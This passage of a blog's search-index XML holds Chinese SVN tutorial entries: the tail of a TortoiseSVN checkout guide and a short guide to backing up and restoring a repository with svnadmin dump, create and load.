通过TortoisSVN检出，路径地址:svn://192.168.0.1/test,输入配置的用户名和密码，即test检出成功。教程至此结束，特此谨记。<br><img src="/images/version/svn/svn01.png" alt="检出效果图"></p>]]></content>
      <categories>
        <category>SVN</category>
      </categories>
      <tags>
        <tag>SVN</tag>
      </tags>
  </entry>
  <entry>
    <title>svn备份还原</title>
    <url>/SVN/6408e029.html</url>
    <content><![CDATA[<p>备份:svnadmin dump D:\Repositories\TestProject &gt; D:\svndumpfile\TestProject_20090722.dump<br>还原：<br>1、将dump文件拷贝到目标机器</p><p>2、在目标机器创建仓库：</p><p>svnadmin create D:/repositories/TestProject</p><p>并注意检查是否需要修改文件夹权限</p><p>3、执行命令svnadmin load:</p><p>svnadmin load D:/repositories/TestProject &lt; D:/TestProject_20090722.dump</p>]]></content>
      <categories>
        <category>SVN</category>
      </categories>
      <tags>
        <tag>SVN</tag>
      </tags>
  </entry>
</search>
